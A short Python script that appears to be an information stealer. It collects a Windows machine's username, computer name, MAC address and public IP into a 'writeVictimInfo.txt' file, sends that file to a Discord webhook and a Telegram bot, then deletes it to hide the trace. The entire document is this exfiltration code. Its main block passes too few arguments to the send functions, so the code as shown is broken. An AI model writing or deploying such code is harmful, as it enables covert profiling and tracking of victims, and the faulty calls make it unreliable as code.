import os
import requests
from getmac import get_mac_address
from pathlib import Path
from dotenv import load_dotenv

# Define environment keys
windows_enviroment = {
    'app_local': 'LOCALAPPDATA',
    'app_roaming': 'APPDATA',
    'computer_name': 'COMPUTERNAME',
    'user_path': 'HOMEPATH',
    'username': 'USERNAME'
}

def get_computer_information():
    # Retrieve environment variables
    computer_user_name = os.getenv(windows_enviroment.get('username'))
    computer_name = os.getenv(windows_enviroment.get('computer_name'))
    computer_mac_address = get_mac_address()
    ip_address = requests.get('https://api.ipify.org?format=json').json()['ip']

    # Set file path
    userprofile_path = os.path.join(os.environ["USERPROFILE"], "Desktop", 'writeVictimInfo.txt')

    # Ensure the directory exists
    os.makedirs(os.path.dirname(userprofile_path), exist_ok=True)

    # Write information to file
    with open(userprofile_path, 'w+', encoding="utf-8") as inforead:
        inforead.write(f'Username: {computer_user_name}\nComputer Name: {computer_name}\nComputer MAC Address: {computer_mac_address}\nIP Address: {ip_address}\n\n')

    print(f"Computer information saved to {userprofile_path}")

    return userprofile_path

def send_info_to_discord(file_path, DISCORD_WEBHOOK_URL, file_description):
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            payload = {'content': file_description, 'username': 'Info Sender'}
            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
            if response.status_code == 204:
                print(f"File {file_path} successfully sent to Discord")
            else:
                print(f"Failed to send file {file_path} to Discord: {response.status_code}")
    except Exception as e:
        print(f"Error sending file to Discord: {e}")

def send_info_to_telegram(file_path, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, file_description):
    try:
        with open(file_path, 'rb') as file:
            response = requests.post(
                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument',
                data={'chat_id': TELEGRAM_CHAT_ID, 'caption': file_description},
                files={'document': file}
            )
            if response.status_code == 200:
                print(f"File {file_path} successfully sent to Telegram")
            else:
                print(f"Failed to send file {file_path} to Telegram: {response.status_code}")
    except Exception as e:
        print(f"Error sending file to Telegram: {e}")

def delete_file(file_path):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"Deleted file: {file_path}")
    except Exception as e:
        print(f"Error deleting file: {e}")

if __name__ == "__main__":
    info_file_path = get_computer_information()
    send_info_to_discord(info_file_path, "Computer Information")
    send_info_to_telegram(info_file_path, "Computer Information")
    delete_file(info_file_path)
